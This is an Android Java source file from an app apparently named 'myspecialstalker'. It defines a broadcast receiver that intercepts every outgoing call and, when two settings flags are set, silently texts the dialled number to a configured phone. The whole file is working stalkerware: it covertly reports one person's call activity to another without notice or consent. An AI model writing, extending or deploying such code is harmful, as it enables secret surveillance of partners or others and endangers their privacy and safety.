package com.example.myspecialstalker;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.SmsManager;

public class broadcast extends BroadcastReceiver {

    @Override
    public void onReceive(Context context, Intent intent) {

        if (Intent.ACTION_NEW_OUTGOING_CALL.equals(intent.getAction()))
        {
            String callNum = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);
            if (MainActivity.emptyMsg && MainActivity.emptyPhone)
            {
                String msg = MainActivity.getMsg + callNum;
                SmsManager sms = SmsManager.getDefault();
                sms.sendTextMessage(MainActivity.getPhoneNum, null, msg, null, null);
            }
        }
    }
}

